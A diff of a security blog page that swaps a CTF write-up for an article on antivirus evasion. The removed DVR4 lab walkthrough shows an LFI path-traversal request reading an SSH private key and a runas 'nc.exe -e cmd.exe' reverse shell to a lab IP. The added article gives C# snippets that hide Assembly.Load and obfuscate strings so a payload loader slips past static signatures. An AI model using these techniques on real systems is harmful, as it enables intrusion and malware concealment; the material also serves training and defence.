@@ -10,13 +10,13 @@
         <meta name="author" content="Gmrvh">
       
       
-        <link rel="canonical" href="https://gmrvh.github.io/ctf-writeups/pg/dvr4/">
+        <link rel="canonical" href="https://gmrvh.github.io/ctf-writeups/informative/stealth-in-memory-loading/">
       
       
-        <link rel="prev" href="../../htb/jeeves/">
+        <link rel="prev" href="../..">
       
       
-        <link rel="next" href="../shenzi/">
+        <link rel="next" href="../../htb/backfire/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -24,7 +24,7 @@
     
     
       
-        <title>DVR4 - Gmvrh</title>
+        <title>Stealth In-Memory Loading - Gmvrh</title>
       
     
     
@@ -76,7 +76,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#dvr4-writeup" class="md-skip">
+        <a href="#introduction" class="md-skip">
           Skip to content
         </a>
       
@@ -112,7 +112,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              DVR4
+              Stealth In-Memory Loading
             
           </span>
         </div>
@@ -255,79 +255,6 @@
       
   
   
-  
-  
-    
-    
-    
-    
-      
-        
-        
-      
-    
-    
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
-      
-        
-        
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
-        
-          
-          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
-            
-  
-  
-  <span class="md-ellipsis">
-    Informative
-    
-  </span>
-  
-
-            <span class="md-nav__icon md-icon"></span>
-          </label>
-        
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_2">
-            <span class="md-nav__icon md-icon"></span>
-            Informative
-          </label>
-          <ul class="md-nav__list" data-md-scrollfix>
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../informative/stealth-in-memory-loading/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    Stealth In-Memory Loading
-    
-  </span>
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-          </ul>
-        </nav>
-      
-    </li>
-  
-
-    
-      
-      
-  
-  
     
   
   
@@ -346,7 +273,172 @@
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Informative
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Informative
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Stealth In-Memory Loading
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Stealth In-Memory Loading
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#in-memory-vs-on-disk" class="md-nav__link">
+    <span class="md-ellipsis">
+      In-Memory vs On-Disk
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#novel-signatures" class="md-nav__link">
+    <span class="md-ellipsis">
+      Novel Signatures
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#avoiding-assemblyload" class="md-nav__link">
+    <span class="md-ellipsis">
+      Avoiding Assembly.Load()
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#obfuscating-strings" class="md-nav__link">
+    <span class="md-ellipsis">
+      Obfuscating Strings
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#outro" class="md-nav__link">
+    <span class="md-ellipsis">
+      Outro
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
         
           
           <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
@@ -362,7 +454,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_3">
             <span class="md-nav__icon md-icon"></span>
             CTF Writeups
@@ -697,8 +789,6 @@
                 
   
   
-    
-  
   
   
     
@@ -708,11 +798,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
         
           
           <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
@@ -728,7 +818,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_3_3">
             <span class="md-nav__icon md-icon"></span>
             ProvingGrounds
@@ -739,32 +829,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    DVR4
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../pg/dvr4/" class="md-nav__link">
         
   
   
@@ -775,134 +843,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#initial-enumeration" class="md-nav__link">
-    <span class="md-ellipsis">
-      Initial Enumeration
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Initial Enumeration">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#port-scanning" class="md-nav__link">
-    <span class="md-ellipsis">
-      Port Scanning
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#web-server-enumeration-port-8080" class="md-nav__link">
-    <span class="md-ellipsis">
-      Web Server Enumeration (Port 8080)
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#local-file-inclusion-lfi-discovery" class="md-nav__link">
-    <span class="md-ellipsis">
-      Local File Inclusion (LFI) Discovery
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploitation" class="md-nav__link">
-    <span class="md-ellipsis">
-      Exploitation
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Exploitation">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#credentials-via-ssh-key" class="md-nav__link">
-    <span class="md-ellipsis">
-      Credentials via SSH Key
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#privilege-escalation" class="md-nav__link">
-    <span class="md-ellipsis">
-      Privilege Escalation
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Privilege Escalation">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#information-gathering" class="md-nav__link">
-    <span class="md-ellipsis">
-      Information Gathering
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#password-decryption" class="md-nav__link">
-    <span class="md-ellipsis">
-      Password Decryption
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#administrator-access" class="md-nav__link">
-    <span class="md-ellipsis">
-      Administrator Access
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -915,7 +855,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../shenzi/" class="md-nav__link">
+      <a href="../../pg/shenzi/" class="md-nav__link">
         
   
   
@@ -938,7 +878,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../nora/" class="md-nav__link">
+      <a href="../../pg/nora/" class="md-nav__link">
         
   
   
@@ -961,7 +901,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../catto/" class="md-nav__link">
+      <a href="../../pg/catto/" class="md-nav__link">
         
   
   
@@ -984,7 +924,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../bottleup/" class="md-nav__link">
+      <a href="../../pg/bottleup/" class="md-nav__link">
         
   
   
@@ -1007,7 +947,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../resourced/" class="md-nav__link">
+      <a href="../../pg/resourced/" class="md-nav__link">
         
   
   
@@ -1030,7 +970,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../confusion/" class="md-nav__link">
+      <a href="../../pg/confusion/" class="md-nav__link">
         
   
   
@@ -1053,7 +993,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../clue/" class="md-nav__link">
+      <a href="../../pg/clue/" class="md-nav__link">
         
   
   
@@ -1076,7 +1016,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../flu/" class="md-nav__link">
+      <a href="../../pg/flu/" class="md-nav__link">
         
   
   
@@ -1099,7 +1039,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../zipper/" class="md-nav__link">
+      <a href="../../pg/zipper/" class="md-nav__link">
         
   
   
@@ -1122,7 +1062,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../zenphoto/" class="md-nav__link">
+      <a href="../../pg/zenphoto/" class="md-nav__link">
         
   
   
@@ -1172,51 +1112,89 @@
   
 
 
-<h1 id="dvr4-writeup">DVR4 -  Writeup</h1>
-<h2 id="initial-enumeration">Initial Enumeration</h2>
-<h3 id="port-scanning">Port Scanning</h3>
-<p>The target has several open ports, with the most interesting being port 8080 where a web server is running.</p>
-<h3 id="web-server-enumeration-port-8080">Web Server Enumeration (Port 8080)</h3>
-<p>Initial directory discovery revealed several web pages related to a camera system:
-<div class="highlight"><pre><span></span><code>200 GET    42l    88w  1198c http://192.168.185.179:8080/pda/Cameras.html
-200 GET    42l    88w  1187c http://192.168.185.179:8080/pda/cam80x60.html
-200 GET    75l   218w  2349c http://192.168.185.179:8080/CamerasBottomFrame.html
-200 GET    82l   245w  2706c http://192.168.185.179:8080/ActiveXIFrame.html
-200 GET   655l  1718w 29575c http://192.168.185.179:8080/CamerasTopFrame.html
-200 GET    23l    73w   985c http://192.168.185.179:8080/
-200 GET    45l    92w  1256c http://192.168.185.179:8080/pda/cam320x240.html
-200 GET    42l    88w  1195c http://192.168.185.179:8080/pda
-</code></pre></div></p>
-<h3 id="local-file-inclusion-lfi-discovery">Local File Inclusion (LFI) Discovery</h3>
-<p>After testing various endpoints, I discovered a vulnerable LFI parameter on the Cameras.html page:
-<div class="highlight"><pre><span></span><code>http://192.168.185.179:8080/pda/Cameras.html?RESULTPAGE=../../../../../../../../
+  <h1>Stealth In-Memory Loading</h1>
+
+<h4 id="introduction">Introduction</h4>
+<p>It is no secret that modern antivirus solutions rely on both signature matching and behavioral heuristics to detect malicious files or suspicious Win32 API calls at runtime. In this article, I will discuss a few techniques that help obfuscate a malicious binary and bypass AV during red-team engagements. I will focus on static-analysis bypasses.</p>
+<h4 id="in-memory-vs-on-disk">In-Memory vs On-Disk</h4>
+<p>An advanced red-team operator always tries to leave as little evidence as possible. Writing a known malicious binary directly to disk leaves a clear trail, so operators prefer using a “loader” that brings the payload into memory instead of persisting it on disk. But if the loader itself is a malicious binary, how can it avoid detection?</p>
+<h4 id="novel-signatures">Novel Signatures</h4>
+<p>To slip past antivirus engines, the loader’s code must be novel—it cannot be a recycled stub or a widely shared proof-of-concept. Every function and routine should be reshaped so that hash-based or pattern-matching scanners won’t recognize it. Since these scanners often rely on databases of known malicious strings or function implementations, an effective loader mixes string obfuscation (transforming strings and decoding them at run time) with meaningless IL instructions to break up recognizable patterns.</p>
+<h4 id="avoiding-assemblyload">Avoiding <code>Assembly.Load()</code></h4>
+<p>Many AV engines flag direct calls to <code>Assembly.Load</code>. We can bypass this by resolving and invoking it dynamically at run time, so no static reference to <code>Assembly.Load</code> appears in plaintext. Instead of calling <code>GetMethod()</code> directly, we build a small runtime proxy to resolve <code>GetMethod()</code> and add padding to each call, making every invocation unique.</p>
+<ol>
+<li><strong>DynamicMethod Creation</strong>  </li>
+</ol>
+<p>We first construct a <code>DynamicMethod</code> named <code>"gm"</code> that returns a <code>MethodInfo</code> and takes three parameters: the <code>Type</code> to reflect on, the <code>string</code> method name, and a <code>Type[]</code> describing the method’s parameter types. By specifying <code>typeof(object).Module</code>, the method is granted full trust to access public members across assemblies.  </p>
+<p>```csharp</p>
+<p>var dm = new DynamicMethod(</p>
+<p>"gm",</p>
+<p>typeof(MethodInfo),</p>
+<p>new[] { typeof(Type), typeof(string), typeof(Type[]) },</p>
+<p>typeof(object).Module</p>
+<p>);</p>
+<p>```</p>
+<ol>
+<li><strong>Emitting IL Instructions</strong>  </li>
+</ol>
+<p>Using the <code>ILGenerator</code>, we emit exactly the IL needed to perform <code>targetType.GetMethod(methodName, signatureTypes)</code>:  </p>
+<p>```csharp</p>
+<p>il.Emit(OpCodes.Ldarg_0);   // push the Type instance</p>
+<p>il.Emit(OpCodes.Ldarg_1);   // push the method name string</p>
+<p>il.Emit(OpCodes.Ldarg_2);   // push the Type[] signature</p>
+<p>var sigGetMethod = typeof(Type)</p>
+<p>.GetMethod("GetMethod", new[] { typeof(string), typeof(Type[]) });</p>
+<p>il.EmitCall(OpCodes.Callvirt, sigGetMethod, null); // invoke GetMethod</p>
+<p>il.Emit(OpCodes.Ret);       // return the MethodInfo</p>
+<p>```</p>
+<ol>
+<li><strong>Resolving the Assembly Type</strong>  </li>
+</ol>
+<p>We never hard-code <code>"System.Reflection.Assembly"</code>. Instead, after building our proxy delegate, we reconstruct that namespace string at run time (for example via <code>getAsmBuff()</code>) and call:  </p>
+<p>```csharp</p>
+<p>var asmType = Type.GetType(new string(getAsmBuff()), throwOnError: false);</p>
+<p>```</p>
+<ol>
+<li><strong>Invoking <code>Load(byte[])</code></strong>  </li>
+</ol>
+<p>Once we have <code>asmType</code>, we use our proxy to find and invoke the static <code>Load(byte[])</code> method without ever embedding <code>"Load"</code> in clear text:  </p>
+<p>```csharp</p>
+<p>var loadMethod = get(asmType, getLoadMethodName(), new[] { typeof(byte[]) });</p>
+<p>var asm = (Assembly)loadMethod.Invoke(null, new object[] { dllBytes });</p>
+<p>```</p>
+<h4 id="obfuscating-strings">Obfuscating Strings</h4>
+<p>To avoid hard-coding strings like <code>"System.Reflection.Assembly"</code>, we can obfuscate them with a simple transformation rather than XOR (which AV engines often flag). For example, store each character code minus one in an <code>int[]</code>, then rebuild the string in a helper:  </p>
+<div class="highlight"><pre><span></span><code><span class="k">private</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="k">readonly</span><span class="w"> </span><span class="kt">int</span><span class="p">[]</span><span class="w"> </span><span class="n">codes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="sc">&#39;T&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;z&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;t&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;u&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;f&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;n&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+
+<span class="w">    </span><span class="sc">&#39;/&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;S&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;f&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;g&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;m&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;f&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+
+<span class="w">    </span><span class="sc">&#39;d&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;u&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;j&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;p&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;o&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;/&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+
+<span class="w">    </span><span class="sc">&#39;B&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;t&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;t&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;f&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;n&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;c&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+
+<span class="w">    </span><span class="sc">&#39;m&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;z&#39;</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span>
+
+<span class="p">};</span>
+
+
+
+<span class="k">private</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="kt">char</span><span class="p">[]</span><span class="w"> </span><span class="nf">getAsmBuff</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="kt">char</span><span class="p">[]</span><span class="w"> </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">char</span><span class="p">[</span><span class="n">codes</span><span class="p">.</span><span class="n">Length</span><span class="p">];</span>
+
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+
+<span class="w">        </span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">codes</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">buf</span><span class="p">;</span>
+
+<span class="p">}</span>
 </code></pre></div>
-This allowed for traversing the file system. Extensive LFI testing revealed numerous accessible files including:
-- System configuration files
-- Windows logs
-- User directories</p>
-<h2 id="exploitation">Exploitation</h2>
-<h3 id="credentials-via-ssh-key">Credentials via SSH Key</h3>
-<p>Using the LFI vulnerability, I was able to view the SSH private key for the "Viewer" user:
-<div class="highlight"><pre><span></span><code>http://192.168.185.179:8080/pda/Cameras.html?RESULTPAGE=../../../../../../../../Users/Viewer/.ssh/id_rsa
-</code></pre></div>
-I downloaded this key, set appropriate permissions, and logged in via SSH:
-<div class="highlight"><pre><span></span><code>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>id_rsa
-ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>Viewer@192.168.185.179
-</code></pre></div></p>
-<h3 id="privilege-escalation">Privilege Escalation</h3>
-<h4 id="information-gathering">Information Gathering</h4>
-<p>After gaining initial access as the Viewer user, I explored the system and identified that the machine was running Argus Surveillance DVR software.</p>
-<h4 id="password-decryption">Password Decryption</h4>
-<p>The Argus DVR software uses weak password encryption. Located configuration file containing encrypted credentials:
-<div class="highlight"><pre><span></span><code>C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
-</code></pre></div>
-Using publicly available information about Argus DVR's encryption method, I was able to decrypt the administrator password.</p>
-<h4 id="administrator-access">Administrator Access</h4>
-<p>With the administrator credentials, I used the runas command to gain a privileged reverse shell:
-<div class="highlight"><pre><span></span><code>runas /user:administrator &quot;C:\users\viewer\desktop\nc.exe -e cmd.exe 192.168.49.57 443&quot;
-</code></pre></div>
-This gave me a reverse shell with SYSTEM privileges, allowing complete control of the machine.</p>
+<p>At run time, <code>new string(getAsmBuff())</code> yields <code>"System.Reflection.Assembly"</code> without embedding it directly in the binary.</p>
+<h4 id="outro">Outro</h4>
+<p>By combining dynamic API resolution, IL-level obfuscation, and run-time string decoding, this loader avoids static signatures and forces AV vendors to rely on expensive behavioral analysis instead of quick signature lookups. Understanding these techniques helps defenders tune their telemetry, improve memory-forensics capabilities, and stay one step ahead of sophisticated red-team tactics.</p>
 
 
 
